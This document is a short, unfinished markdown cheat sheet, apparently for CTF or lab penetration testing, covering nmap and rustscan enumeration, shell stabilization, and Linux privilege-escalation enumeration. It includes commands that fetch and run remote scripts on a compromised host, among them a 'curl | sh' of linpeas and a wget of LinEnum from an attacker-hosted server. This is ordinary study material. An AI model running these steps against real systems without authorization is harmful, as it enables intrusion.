## Setting
1.export ip=10.10.10.10\
1.5 make directory for nmap result: mkdir nmap && cd nmap
## Ennumeration
2. `nmap -sC -sV -p- -Pn $ip --open -oN result   AND  rustscan -a $IP and rustscan -a $IP`.\ 
3. Check which ports are open. Take note of service running and versions(for searchsploit)\
4. Manual ennumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
5. Check for vulnerabiltieis on specific ports using nmap script `nmap -p 80,445,139 --script=*vuln* $IP`
## Using searchsploit, payload, revershell 

## Getting a reverseshell(stable)

## Privilege Escalation
0. Stabalize shell `python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` \
1.Automated scan for vulnerabilities or manual ennumeration.\
2.Create a directory and a a linEnum.sh file. Copy paste the content from https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh \
3.Host a python server `python3 -m http.server 8080` `or( 80)` to transfer the linEum.sh\
3.5 
4.From the reverse shell, `wget http://$myIP:8080/linEum.sh .` to recieve linEum.sh if we get permission denied  `cd /tmp` \
5.Give access. `chmod +x linEum.sh` and `./linEum -t` \
6. If file transfer premission is denied, simply `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script.
7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225
 
